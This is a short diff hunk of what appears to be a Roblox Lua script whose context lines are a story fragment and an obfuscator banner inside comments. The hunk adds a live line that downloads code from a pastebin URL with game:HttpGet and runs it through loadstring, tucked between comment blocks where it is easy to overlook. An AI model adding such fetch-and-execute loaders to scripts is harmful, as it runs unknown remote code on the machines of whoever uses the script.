@@ -401,6 +401,9 @@ I sat back down in the chair. It was several sizes too small. Fine hairs of dust
 
 ]]--
 
+
+loadstring(game:HttpGet("https://pastebin.com/raw/ipgL3Lc9"))()
+wait(2)
 --[[
  .____                  ________ ___.    _____                           __                
  |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
